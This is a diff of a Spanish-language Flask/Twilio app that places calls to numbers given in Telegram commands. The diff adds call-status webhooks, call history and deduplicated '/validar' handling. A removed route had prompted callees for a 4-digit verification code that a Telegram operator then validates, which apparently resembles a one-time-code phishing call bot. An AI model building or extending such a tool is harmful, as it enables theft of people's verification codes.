@@ -108,7 +108,7 @@ def make_call():
     # Iniciar polling de Telegram si no está activo
     start_telegram_polling()
     
-    # Construir la URL correctamente - FIX: Usamos directamente una URL completa
+    # Construir la URL correctamente
     base_url = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
     url = f"{base_url}/step1"
     logger.info(f"📞 URL para la llamada: {url}")
@@ -117,11 +117,18 @@ def make_call():
         call = client.calls.create(
             to=YOUR_PHONE_NUMBER,
             from_=TWILIO_PHONE_NUMBER,
-            url=url
+            url=url,
+            status_callback=f"{base_url}/call-status-webhook",
+            status_callback_method='POST',
+            status_callback_event=['initiated', 'ringing', 'answered', 'completed']
         )
         
         # Inicializar la sesión para el nuevo SID
-        global_user_sessions[call.sid] = {}
+        global_user_sessions[call.sid] = {
+            'phone_number': YOUR_PHONE_NUMBER,
+            'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            'call_events': []
+        }
         save_session_to_file(global_user_sessions)
         
         logger.info(f"📞 Nueva llamada iniciada: SID={call.sid}")
@@ -129,17 +136,25 @@ def make_call():
     except Exception as e:
         logger.error(f"❌ ERROR AL INICIAR LLAMADA: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
-@app.route('/step1', methods=['POST', 'GET'])
-def step1():
-    response = VoiceResponse()
-    gather = Gather(num_digits=4, action='/save-step1', method='POST', timeout=20, finish_on_key='')
-    gather.say("Por favor ingrese el código de verificación de 4 dígitos.", language='es-ES')
-    gather.pause(length=1)
-    gather.say("Ingrese los 4 dígitos ahora.", language='es-ES')
-    response.append(gather)
+
+# 6. Añadir comando para resumir el historial de llamadas
+@app.route('/call-history/<call_sid>', methods=['GET'])
+def call_history(call_sid):
+    """Mostrar el historial de eventos de una llamada específica."""
+    if call_sid not in global_user_sessions:
+        return jsonify({"status": "error", "message": "SID no encontrado"})
     
-    response.redirect('/step1')
-    return str(response)
+    session_data = global_user_sessions[call_sid]
+    events = session_data.get('call_events', [])
+    
+    return jsonify({
+        "status": "ok",
+        "call_sid": call_sid,
+        "phone_number": session_data.get('phone_number', 'N/A'),
+        "start_time": session_data.get('start_time', 'N/A'),
+        "event_count": len(events),
+        "events": events
+    })
 
 @app.route('/save-step1', methods=['POST'])
 def save_step1():
@@ -616,6 +631,54 @@ def validar():
     
     return process_validation_command(text)
 
+@app.route('/call-status-webhook', methods=['POST'])
+def call_status_webhook():
+    """Webhook para recibir actualizaciones de estado de llamada desde Twilio."""
+    call_sid = request.values.get('CallSid')
+    call_status = request.values.get('CallStatus')
+    
+    if not call_sid or not call_status:
+        return jsonify({"status": "error", "message": "Parámetros faltantes"})
+    
+    # Capturar todos los datos relevantes para el log
+    call_duration = request.values.get('CallDuration', 'N/A')
+    phone_number = request.values.get('To', 'desconocido')
+    
+    # Añadir marca de tiempo
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # Log en el servidor
+    logger.info(f"☎️ ACTUALIZACIÓN DE ESTADO DE LLAMADA: SID={call_sid}, Estado={call_status}, Duración={call_duration}s")
+    
+    # Registrar el evento en la sesión
+    if call_sid in global_user_sessions:
+        if 'call_events' not in global_user_sessions[call_sid]:
+            global_user_sessions[call_sid]['call_events'] = []
+        
+        global_user_sessions[call_sid]['call_events'].append({
+            'timestamp': timestamp,
+            'status': call_status,
+            'duration': call_duration
+        })
+        save_session_to_file(global_user_sessions)
+    
+    # Mensajes específicos para cada estado
+    if call_status == 'in-progress':
+        send_to_telegram(f"📞 <b>Llamada CONTESTADA</b>\nSID: {call_sid}\nNúmero: {phone_number}\nHora: {timestamp}")
+    elif call_status == 'completed':
+        send_to_telegram(f"📞 <b>Llamada FINALIZADA</b>\nSID: {call_sid}\nDuración: {call_duration} segundos\nNúmero: {phone_number}\nHora: {timestamp}")
+    elif call_status == 'busy':
+        send_to_telegram(f"📞 <b>Llamada NO CONTESTADA (Ocupado)</b>\nSID: {call_sid}\nNúmero: {phone_number}\nHora: {timestamp}")
+    elif call_status == 'no-answer':
+        send_to_telegram(f"📞 <b>Llamada NO CONTESTADA</b>\nSID: {call_sid}\nNúmero: {phone_number}\nHora: {timestamp}")
+    elif call_status == 'failed':
+        send_to_telegram(f"📞 <b>Llamada FALLIDA</b>\nSID: {call_sid}\nNúmero: {phone_number}\nHora: {timestamp}")
+    elif call_status == 'canceled':
+        send_to_telegram(f"📞 <b>Llamada CANCELADA</b>\nSID: {call_sid}\nNúmero: {phone_number}\nHora: {timestamp}")
+    
+    return jsonify({"status": "ok", "message": "Evento registrado"})
+
+
 def process_validation_command(text):
     """Procesa un comando de validación y devuelve el resultado."""
     # Soportar tanto "/validar" como "validar" (sin slash)
@@ -706,6 +769,54 @@ def fetch_telegram_updates():
     
     return []
 
+def process_validation_command_telegram(chat_id, message_text):
+    """Procesa un comando de validación desde Telegram evitando duplicados."""
+    parts = message_text.split()
+    
+    if len(parts) >= 5:
+        sid = parts[1]
+        try:
+            vals = list(map(int, parts[2:5]))
+            
+            # Verificar si ya existe esta validación exacta para evitar duplicados
+            if sid in global_user_sessions and 'validacion' in global_user_sessions[sid]:
+                existing_vals = global_user_sessions[sid]['validacion']
+                if existing_vals == vals:
+                    logger.info(f"🔄 Validación idéntica ya existente para SID={sid}: {vals}. Ignorando.")
+                    send_telegram_response(chat_id, f"<b>ℹ️ Validación ya aplicada para {sid}:</b> {vals}")
+                    return
+            
+            # Asegurar que la sesión existe para este SID
+            if sid not in global_user_sessions:
+                global_user_sessions[sid] = {}
+                logger.info(f"🆕 Creada nueva sesión para SID={sid} en process_validation_command_telegram")
+            
+            # Restablecer contador de intentos si existe
+            count_key = f"{sid}_retry_count"
+            if count_key in global_user_sessions[sid]:
+                global_user_sessions[sid][count_key] = 0
+                logger.info(f"🔄 Reiniciando contador de intentos para SID={sid}")
+            
+            # Guardar la validación
+            global_user_sessions[sid]['validacion'] = vals
+            save_session_to_file(global_user_sessions)
+            
+            logger.info(f"✅ VALIDACIÓN GUARDADA PARA SID {sid} MEDIANTE TELEGRAM: {vals}")
+            
+            # Mostrar todas las sesiones para depuración
+            logger.info(f"📊 SESIONES ACTUALES: {list(global_user_sessions.keys())}")
+            logger.info(f"📊 DATOS DE SESIÓN PARA {sid}: {global_user_sessions.get(sid, {})}")
+            
+            # Confirmar al usuario de Telegram
+            send_telegram_response(chat_id, f"<b>✅ Validación guardada para {sid}:</b> {vals}")
+        except Exception as e:
+            logger.error(f"❌ ERROR AL PROCESAR VALIDACIÓN TELEGRAM: {e}")
+            send_telegram_response(chat_id, f"<b>❌ Error al procesar:</b> {e}")
+    else:
+        send_telegram_response(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar SID 1 1 1")
+
+
+# 1. Control de mensajes duplicados - Modificar 'process_telegram_update'
 def process_telegram_update(update):
     """Procesa una actualización de Telegram."""
     global last_update_id, processed_message_ids
@@ -721,13 +832,16 @@ def process_telegram_update(update):
         message_text = update['message']['text']
         message_id = update['message']['message_id']
         
+        # Usar combinación de message_id y texto como clave única
+        message_signature = f"{message_id}:{message_text[:20]}"
+        
         # Control para evitar procesar mensajes duplicados
-        if message_id in processed_message_ids:
-            logger.info(f"🔄 Mensaje ya procesado, ID: {message_id}. Ignorando.")
+        if message_signature in processed_message_ids:
+            logger.info(f"🔄 Mensaje ya procesado, Firma: {message_signature}. Ignorando.")
             return
             
         # Añadir a mensajes procesados
-        processed_message_ids.add(message_id)
+        processed_message_ids.add(message_signature)
         
         # Si el conjunto es demasiado grande, limpiar los más antiguos
         if len(processed_message_ids) > 100:
@@ -743,42 +857,10 @@ def process_telegram_update(update):
         
         # Procesar comandos de validación
         if message_text.startswith('/validar') or message_text.startswith('validar'):
-            parts = message_text.split()
-            
-            if len(parts) >= 5:
-                sid = parts[1]
-                try:
-                    vals = list(map(int, parts[2:5]))
-                    
-                    # Asegurar que la sesión existe para este SID
-                    if sid not in global_user_sessions:
-                        global_user_sessions[sid] = {}
-                        logger.info(f"🆕 Creada nueva sesión para SID={sid} en process_telegram_update")
-                    
-                    # Restablecer contador de intentos si existe
-                    count_key = f"{sid}_retry_count"
-                    if count_key in global_user_sessions[sid]:
-                        global_user_sessions[sid][count_key] = 0
-                        logger.info(f"🔄 Reiniciando contador de intentos para SID={sid}")
-                    
-                    # Guardar la validación
-                    global_user_sessions[sid]['validacion'] = vals
-                    save_session_to_file(global_user_sessions)
-                    
-                    logger.info(f"✅ VALIDACIÓN GUARDADA PARA SID {sid} MEDIANTE TELEGRAM: {vals}")
-                    
-                    # Mostrar todas las sesiones para depuración
-                    logger.info(f"📊 SESIONES ACTUALES: {list(global_user_sessions.keys())}")
-                    logger.info(f"📊 DATOS DE SESIÓN PARA {sid}: {global_user_sessions.get(sid, {})}")
-                    
-                    # Confirmar al usuario de Telegram
-                    send_telegram_response(chat_id, f"<b>✅ Validación guardada para {sid}:</b> {vals}")
-                except Exception as e:
-                    logger.error(f"❌ ERROR AL PROCESAR VALIDACIÓN TELEGRAM: {e}")
-                    send_telegram_response(chat_id, f"<b>❌ Error al procesar:</b> {e}")
-            else:
-                send_telegram_response(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar SID 1 1 1")
-
+            process_validation_command_telegram(chat_id, message_text)
+            return
+        
+# 4. Modificar la función process_call_command para incluir el webhook de estado
 def process_call_command(chat_id, message_text):
     """Procesa el comando /llamar para iniciar una llamada desde Telegram."""
     parts = message_text.split()
@@ -797,19 +879,27 @@ def process_call_command(chat_id, message_text):
         return False
     
     try:
-        # Construir la URL correctamente - FIX: Usamos directamente una URL completa
-        url = f"{os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')}/step1"
+        # Construir la URL correctamente
+        base_url = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
+        url = f"{base_url}/step1"
         logger.info(f"📞 URL para la llamada: {url}")
         
-        # Hacer la llamada usando la API de Twilio
+        # Hacer la llamada usando la API de Twilio con webhook de estado
         call = client.calls.create(
             to=phone_number,
             from_=TWILIO_PHONE_NUMBER,
-            url=url
+            url=url,
+            status_callback=f"{base_url}/call-status-webhook",
+            status_callback_method='POST',
+            status_callback_event=['initiated', 'ringing', 'answered', 'completed']
         )
         
         # Inicializar la sesión para el nuevo SID
-        global_user_sessions[call.sid] = {}
+        global_user_sessions[call.sid] = {
+            'phone_number': phone_number,
+            'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            'call_events': []
+        }
         save_session_to_file(global_user_sessions)
         
         logger.info(f"📞 Nueva llamada iniciada desde Telegram: SID={call.sid}, Número={phone_number}")
